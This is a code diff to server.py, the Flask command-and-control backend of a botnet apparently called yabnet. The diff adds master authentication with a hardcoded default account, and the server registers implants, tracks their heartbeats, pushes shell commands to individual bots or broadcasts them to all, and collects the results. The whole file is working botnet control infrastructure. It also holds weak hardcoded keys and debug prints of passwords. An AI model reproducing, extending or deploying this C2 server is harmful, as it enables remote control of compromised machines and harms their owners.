@@ -5,16 +5,12 @@ from datetime import datetime
 from models import Bot
 from models import Command
 from models import db 
+from models import User 
 
 """
 Name: server.py 
 Description: Python Flask Backend for the botnet. Takes care of the bot/command database and the API related with it. 
 Also takes are of master console's request/response. 
-
-TODO: Add "lastcheckin" in Bot. Upon master's "list" command, 
-go through all the Bots and remove all the bots which did not checkin
-for 5 cycles 
-TODO2: Actually make a working server 
 
 """
 
@@ -24,13 +20,18 @@ app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
 db.app = app
 db.init_app(app)
 
-FIRSTCONTACTKEY = 'firstcontactkey'
+# Users - CHANGE ME for operation!! 
+MASTERNAME = 'u'
+MASTERPASSWORD = 'p'
+
 # TODO: Change the register key to change dynamically 
+# Keys - Hardcoded for now, going to make them random
+FIRSTCONTACTKEY = 'firstcontactkey'
 REGISTERKEY = 'registerkey'
 MASTERKEY = 'masterkey'
 
 # TODO: Implement this function 
-def postcheck(requestobj, *args):
+def posterrorcheck(requestobj, *args):
     """
     Description: Post check will see if the incoming post request from python flask 
     has any errors or not. 
@@ -52,6 +53,9 @@ def postcheck(requestobj, *args):
 
     data = requestobj.form
 
+    if data is None:
+        return jsonify({'error': 'post parameters cannot be null'})
+
     for arg in args:
         try:
             if data[arg] is None:
@@ -61,14 +65,32 @@ def postcheck(requestobj, *args):
 
     return True 
 
-def init_db():
-    db.drop_all()
-    db.create_all()
-    db.session.commit()
-
 @app.route('/')
 def hello_world():
     return "Hello, world!"
+
+@app.route('/auth', methods=['POST'])
+def authentication():
+    error = posterrorcheck(request, 'username', 'password')
+    if error is not True:
+        return error 
+
+    data = request.form
+    username = data['username']
+    password = data['password']
+
+    print("[DEBUG] username = ", username)
+    print("[DEBUG] password = ", password)
+
+    try:
+        user = User.query.filter_by(username=username).first()
+        if (user.check_password(password)):
+            return jsonify({'result':'SUCCESS', 'masterkey': MASTERKEY})
+        else:
+            return jsonify({'result': 'Wrong username and/or password'})
+
+    except Exception as e:
+        return jsonify({'result': 'Wrong username and/or password'})
 
 @app.route('/heartbeat', methods=['POST'])
 def heartbeat():
@@ -76,16 +98,19 @@ def heartbeat():
     Description: Endpoint which takes report of bots' heartbeat. Will check
     if the bot is still alive, and update the timestamp of the bot as well. 
     """
-    if request.method != 'POST':
-        return jsonify({'error': 'wrong HTTP method'})
 
+    # Error checking 
+    error = posterrorcheck(request, 'ip', 'user')
+    if error is not True:
+        return error 
+
+    # POST parameter parsing 
     data = request.form
 
     ip = data['ip']
     user = data['user']
 
-    print("[DEBUG] user = ", user)
-
+    # API Endpoint logic 
     # See if the bot exists, and if it does, update and refresh the timestamp    
     try:
         query_bot = Bot.query.filter_by(ip=ip).filter_by(user=user).first()
@@ -106,16 +131,20 @@ def firstcontact():
         contact is coming from the implant or not 
     """
 
-    if request.method != 'POST':
-        return jsonify({'error': 'wrong HTTP method'})
+    # Error checking 
+    error = posterrorcheck(request, 'firstcontactkey')
+    if error is not True:
+        return error 
 
+    # POST parameter parsing 
     data = request.form
+    firstcontact = data['firstcontactkey']
 
-    if (postcheck(request, 'firstcontactkey')):
-        if data['firstcontactkey'] == FIRSTCONTACTKEY:
-            return jsonify({'result': 'success', 'registerkey': 'registerkey'})
-        else:
-            return jsonify({'error': 'wrong firstcontactkey'})
+    # API Endpoint logic 
+    if firstcontact == FIRSTCONTACTKEY:
+        return jsonify({'result': 'success', 'registerkey': 'registerkey'})
+    else:
+        return jsonify({'error': 'wrong firstcontactkey'})
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -129,39 +158,40 @@ def register():
         - ip = IP address of the bot 
         - os = OS type (Nix/Windows) of the bot 
     """
-    if request.method != 'POST':
-        return jsonify({'error': 'wrong HTTP method'})
 
+    # Error checking 
+    error = posterrorcheck(request, 'registerkey', 'ip', 'os', 'user')
+    if error is not True:
+        return error 
+
+    # POST parameter parsing 
     data = request.form
     registerkey = data['registerkey']
     bot_ip = data['ip']
     bot_os = data['os']
     bot_user = data['user']
 
-    print("[DEBUG] firstcontact data = ", data)
+    # API Endpoint logic 
+    try:
+        query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
+    except Exception as e:
+        print("[!]", e)
 
-    if(postcheck(request, 'registerkey', 'ip', 'os', 'user')):
-        try:
-            query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
-        except Exception as e:
-            print("[!]", e)
+    if query_bot is not None:
+        return jsonify({'error': 'Bot already registered'})
 
-        if query_bot is not None:
-            return jsonify({'error': 'Bot already registered'})
+    else:
+        print("[+] Added a new bot !")
+        bot = Bot(bot_ip, bot_os, bot_user)
+        db.session.add(bot)
+        db.session.commit()
 
-        else:
-            print("[+] Added a new bot !")
-            bot = Bot(bot_ip, bot_os, bot_user)
-            db.session.add(bot)
-            db.session.commit()
-
-            return jsonify({'result': 'Bot was added'})
+        return jsonify({'result': 'Bot was added'})
 
 
 @app.route('/bot/<bot_ip>/push', methods=['POST'])
 def botpush(bot_ip):
     """
-    TODO: This + cmd Model + Master key to reach this API endpoint 
     Description: Pushes the command into the cmd Model. Remember to create cmd Model for the database!
 
     [POST]
@@ -170,21 +200,18 @@ def botpush(bot_ip):
 
     """
 
-    if request.method != 'POST':
-        return jsonify({'error': 'wrong HTTP method'})
+    # Error checking 
+    error = posterrorcheck(request, 'masterkey', 'cmd')
+    if error is not True:
+        return error 
 
+    # POST parameter parsing 
     data = request.form
     masterkey = data['masterkey']
     cmd = data['cmd']
 
+    # API Endpoint logic 
     try:
-        if data is None:
-            return jsonify({'error': 'Could not process body parameters'})
-        if masterkey is None:
-            return jsonify({'error': 'masterkey is required'})
-        if cmd is None:
-            return jsonify({'error': 'cmd is required'})
-
         # Query and get the bot which has the bot_ip, and then append the command to it 
         query_bot = Bot.query.filter_by(ip=bot_ip).first()
         cmd = Command(cmd, query_bot.id, bot_ip)
@@ -216,21 +243,20 @@ def bottask(bot_ip):
     target machine 
 
     [POST]
-        - regsiterkey = "Authentication" key for the bot  
+        - registerkey = "Authentication" key for the bot  
     """
 
-    if request.method != 'POST':
-        return jsonify({'error': 'wrong HTTP method'})
+    # Error checking 
+    error = posterrorcheck(request, 'registerkey')
+    if error is not True:
+        return error 
 
+    # POST Parmeter parsing 
     data = request.form
     registerkey = data['registerkey']
 
+    # API Endpoint logic 
     try:
-        if data is None:
-            return jsonify({'error': 'Could not process body parameters'})
-        elif registerkey is None:
-            return jsonify({'error': 'regsiterkey is required'})
-
         # Get the bot corresponding with the bot_ip
         try: 
             query_bot = Bot.query.filter_by(ip=bot_ip).first()
@@ -264,15 +290,18 @@ def botresult(bot_ip):
         - result = 
     """
 
+    # Error checking 
     if request.method != 'POST':
         return jsonify({'error': 'wrong HTTP method'})
 
+    # POST Parameter parsing 
     data = request.form
     if data is None:
         return jsonify({'error': 'body cannot be empty'})
 
+    # API Endpoint logic 
     try:
-        # If a bot is visiting the endpoint, submit the result into the database 
+        # Bot visiting endpoint with result. Push result into the database.  
         if 'registerkey' in data:
             if data['registerkey'] == REGISTERKEY:
                 result = data['result']
@@ -286,7 +315,7 @@ def botresult(bot_ip):
                 # This needs to be changed 
                 return '' 
 
-        # If a master is visiting the endpoint, return the result to the master 
+        # Master visiting endpoint. Return result of the command. 
         elif 'masterkey' in data:
             try:
                 query_bot = Bot.query.filter_by(ip=bot_ip).first()
@@ -308,9 +337,8 @@ def botresult(bot_ip):
         return jsonify({ 'error': str(e) })
     
 
-# TODO: Change to POST, implement master authentication for OPSEC 
 # TODO: Change the result to json, as this is an API endpoint 
-@app.route('/bot/list', methods=['GET'])
+@app.route('/bot/list', methods=['POST'])
 def botlist():
     """
     Description: View and return all the bots in the server database
@@ -318,14 +346,21 @@ def botlist():
     TODO2: Implement filtering function - wait on this thought for now 
     """
 
-    botlist = Bot.query.all()
+    # Error checking 
+    error = posterrorcheck(request, 'masterkey')
+    if error is not True:
+        return error 
+
+    try:
+        botlist = Bot.query.all()
+    except Exception as e:
+        return jsonify({'error': str(e)})
 
     # Refresh bot list. Remove bot if it hasn't come back for TIMER*5 
     for bot in botlist:
         if (datetime.now() - bot.timestamp).total_seconds() > 30:
             db.session.delete(bot)
         db.session.commit()
-
 
     result = '' 
 
@@ -335,9 +370,18 @@ def botlist():
 
     return result
 
-@app.route('/bot/commands', methods=['GET'])
+@app.route('/bot/commands', methods=['POST'])
 def commandlist():
-    commandlist = Command.query.all()
+
+    # Error checking 
+    error = posterrorcheck(request, 'registerkey')
+    if error is not True:
+        return error 
+
+    try:
+        commandlist = Command.query.all()
+    except Exception as e:
+        return jsonify({'error': str(e)})
 
     result = ''
 
@@ -358,21 +402,18 @@ def broadcast():
         - command = Actual command to be pushed to the entire bots 
     """
 
-    if request.method != 'POST':
-        return jsonify({'error': 'wrong HTTP method'})
+    # Error checking 
+    error = posterrorcheck(request, 'masterkey', 'cmd')
+    if error is not True:
+        return error 
 
+    # POST parameter parsing 
     data = request.form
-
     masterkey = data['masterkey']
     command = data['cmd']
 
-    if data is None:
-        return jsonify({'error': 'body cannot be empty'})
-    elif masterkey != MASTERKEY:
-        return jsonify({'error': 'you are not master'})
-    elif command is None:
-        return jsonify({'error': 'command cannot be null'})
 
+    # API Endpoint logic 
     bots = Bot.query.all()
 
     try:
@@ -395,6 +436,15 @@ def broadcast():
 
 
 # ========================= Flask App Starts ======================
+
+
+def init_db():
+    db.drop_all()
+    db.create_all()
+    master = User(username=MASTERNAME)
+    master.set_password(MASTERPASSWORD)
+    db.session.add(master)
+    db.session.commit()
 
 
 init_db()
